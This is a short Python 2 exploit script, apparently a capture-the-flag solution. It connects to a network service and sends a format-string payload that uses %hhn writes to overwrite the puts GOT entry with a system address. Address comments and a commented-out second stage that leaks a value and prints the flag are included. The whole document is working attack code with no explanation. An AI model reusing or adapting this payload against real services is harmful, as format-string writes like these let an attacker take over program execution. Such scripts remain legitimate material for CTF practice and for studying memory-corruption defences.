import socket, time, struct

def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	return s

def recv_time(s):
	time.sleep(0.2)
	return s.recv(2048)

def send_print(s, d):
	print "[+]send :", d + "\\n"
	s.send(d + "\n")

def p(a): return struct.pack("<I",a)

if __name__ == "__main__":
	ip = "172.28.21.249"
	port = 4339

	s = sock(ip, port)
	print "[*]connect :", ip + ":" + str(port)

	msg = recv_time(s)

	d = "\x18\xa0\x16\x04\x08"
	d += "\x19\xa0\x16\x04\x08"
	d += "\x1a\xa0\x16\x04\x08"
	d += "\x1b\xa0\x16\x04\x08"
	d += "%49x%7$hhn"
	d += "%67x%8$hhn"
	d += "%128x%9$hhn"
	d += "%256x%10$hhn"

	send_print(s, d)

	msg = recv_time(s)
	print msg


# system : 0x8048441
# 0x41 : 65, 0x84 : 132, 0x04 : 4, 0x08, 8
# 49 67 128 4
# got_puts : 0x804a018


"""
	msg = msg.split("\n")[0]
	msg = msg.split(" ")[4]

	print "[+]x :", msg

	msg = msg.lstrip("0x")

	d = p(int(msg, 16))
	d += "%1333x%19$hn"

	send_print(s, d)

	msg = recv_time(s)
	msg = msg.split("\n")
	print "[+]flag :", msg[2]

"""